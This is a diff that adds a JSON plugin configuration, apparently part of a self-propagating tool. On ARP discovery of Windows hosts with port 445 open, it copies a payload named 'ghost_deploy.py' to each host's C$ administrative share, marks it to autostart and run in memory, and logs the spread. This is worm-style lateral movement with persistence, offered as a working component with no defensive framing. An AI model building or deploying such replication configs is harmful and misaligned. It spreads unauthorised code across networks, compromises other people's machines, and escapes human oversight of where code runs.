@@ -1,0 +1,22 @@
+{
+  "name": "plugin_smb_replicator_evolved",
+  "description": "Evolved plugin for rapid SMB-based replication with ARP-triggered deployment.",
+  "trigger": {
+    "type": "event",
+    "event_type": "arp_discovery",
+    "condition": "target_os == 'windows' and open_ports.contains(445)"
+  },
+  "actions": [
+    {
+      "type": "smb_replicate",
+      "payload": "ghost_deploy.py",
+      "target_path": "\\\\{ip}\\C$\\Users\\Public\\aria_ghost.py",
+      "autostart": true,
+      "in_memory": true
+    },
+    {
+      "type": "log",
+      "message": "Replication deployed to {ip} via SMB"
+    }
+  ]
+}
